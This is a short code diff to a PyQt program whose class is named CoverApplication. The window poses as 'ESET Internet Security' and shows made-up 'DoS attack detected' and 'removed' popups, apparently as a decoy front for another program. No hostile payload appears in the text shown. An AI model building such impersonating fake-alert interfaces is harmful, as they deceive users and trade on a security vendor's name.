@@ -37,12 +37,12 @@ class CoverApplication(QMainWindow):
         self.setGeometry(100, 100, 1000, 500)
         self.setWindowTitle('ESET Internet Security')
         self.show()
-
+        
         popupWarning = QWidget()
         popupWarning.setWindowTitle('Warning')
         popupWarning.setGeometry(100, 100, 100, 10)
 
-        popupWarning.buttonReply = QMessageBox.information(self, 'WARNING!', "DDoS attack detected. Run the wizard to remove it.", QMessageBox.Ok)
+        popupWarning.buttonReply = QMessageBox.information(self, 'WARNING!', "DoS attack detected. Run the wizard to remove it.", QMessageBox.Ok)
         if popupWarning.buttonReply == QMessageBox.Ok:
             popupWarning.hide()
             return
@@ -60,7 +60,7 @@ class CoverApplication(QMainWindow):
             popup.setWindowTitle('Done')
             popup.setGeometry(100, 100, 100, 10)
 
-            popup.buttonReply = QMessageBox.information(self, 'Finished', "DDoS attack removed succesfully.", QMessageBox.Ok)
+            popup.buttonReply = QMessageBox.information(self, 'Finished', "DoS attack removed succesfully.", QMessageBox.Ok)
             if popup.buttonReply == QMessageBox.Ok:
                 popup.hide()
                 self.show()
@@ -109,5 +109,4 @@ if __name__ == '__main__':
     ex = CoverApplication()
     sys.exit(app.exec_())
 
-# URADI DODAVANJE PORUKE
 # VIDI STA JE SA SLIKOM KADA SE KOMPAJLIRA U EXE FAJL
